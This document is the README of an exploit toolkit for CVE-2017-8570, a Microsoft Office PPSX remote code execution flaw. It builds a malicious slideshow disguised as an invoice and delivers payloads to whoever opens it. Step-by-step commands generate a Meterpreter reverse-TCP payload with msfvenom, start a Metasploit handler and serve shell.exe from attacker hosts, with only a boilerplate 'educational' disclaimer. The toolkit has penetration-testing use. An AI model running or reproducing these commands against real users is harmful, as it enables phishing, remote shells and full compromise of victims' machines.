# Office8570
## Exploit toolkit CVE-2017-8570 - v1.0

Exploit toolkit CVE-2017-8570 - v1.0 is a handy python script which provides pentesters and security researchers a quick and effective way to exploit Microsoft Office PPSX RCE. It could generate a malicious PPSX file and deliver metasploit / meterpreter / other payload to user without any complex configuration.

### Video tutorial (for v1.0)

https://youtu.be/lSaRS-54kQc

### Release note:

Introduced following capabilities to the script

	- Generate Malicious PPSX file using -M gen argument
	- Run script in exploitation mode using -M exp argument
	- Deliver custom SCT file ( using -H argument )
	- Deliver remote payload

Version: Python version 2.7.13

### Future release:

Working on following feature

	- Enhance README.md

### Scenario 1: Deliver local payload
###### Example commands
	1) Generate malicious PPSX file
	   # python cve-2017-8570_toolkit.py -M gen -w Invoice.ppsx -u http://192.168.56.1/logo.doc
	2) (Optional, if using MSF Payload) : Generate metasploit payload and start handler
	   # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f exe > /tmp/shell.exe
	   # msfconsole -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.1; run"
	3) Start toolkit in exploit mode to deliver local payload
	   # python cve-2017-8570_toolkit.py -M exp -e http://192.168.56.1/shell.exe -l /tmp/shell.exe


### Scenario 2: Deliver Remote payload
###### Example commands
	1) Generate malicious PPSX file
	   # python cve-2017-8570_toolkit.py -M gen -w Invoice.ppsx -u http://192.168.56.1/logo.doc
	2) Start toolkit in exploit mode to deliver remote payload
	   # python cve-2017-8570_toolkit.py -M exp -e http://remoteserver.com/shell.exe


### Scenario 3: Deliver custom SCT file
###### Example commands
	1) Generate malicious PPSX file
	   # python cve-2017-8570_toolkit.py -M gen -w Invoice.ppsx -u http://192.168.56.1/logo.doc
	2) Start toolkit in exploit mode to deliver custom SCT file
	   # python cve-2017-8570_toolkit.py -M exp -H /tmp/custom.sct


### Command line arguments:

    # python cve-2017-8570_toolkit.py -h

    This is a handy toolkit to exploit CVE-2017-8570 (Microsoft Office PPSX RCE)

    Modes:

    -M gen                                          Generate Malicious PPSX file only

         Generate malicious PPSX file:

          -w <Filename.ppsx>                   Name of malicious PPSX file (Share this file with victim).

          -u <http://attacker.com/test.sct>   The path to an sct file. Normally, this should be a domain or IP where        this                                          tool is running.
	                                      For example, http://attackerip.com/test.sct (This URL will be included in 	                                              malicious PPSX file and will be requested once victim will open malicious PPSX file.

					      
    -M exp                                          Start exploitation mode

         Exploitation:
	 
          -H </tmp/custom.sct>                Local path of a custom SCT file which needs to be delivered and executed on target.
	                                          NOTE: This option will not deliver payloads specified through options "-e" and "-l"
						  
          -p <TCP port:Default 80>            Local port number.

          -e <http://attacker.com/shell.exe>  The path of an executable file / meterpreter shell / payload  which needs to be executed on target.

          -l </tmp/shell.exe>                 If payload is hosted locally, specify local path of an executable file / meterpreter shell / payload.


### Disclaimer

This program is for Educational purpose ONLY. Do not use it without permission. The usual disclaimer applies, especially the fact that me (bhdresh) is not liable for any damages caused by direct or indirect use of the information or functionality provided by these programs. The author or any Internet provider bears NO responsibility for content or misuse of these programs or any derivatives thereof. By using this program you accept the fact that any damage (dataloss, system crash, system compromise, etc.) caused by the use of these programs is not bhdresh's responsibility.

### Credit

@Haifei Li for presentation slides, @bhdresh

### Bug, issues, feature requests

Obviously, I am not a fulltime developer so expect some hiccups

Please report bugs, issues through https://github.com/bhdresh/CVE-2017-8570/issues/new
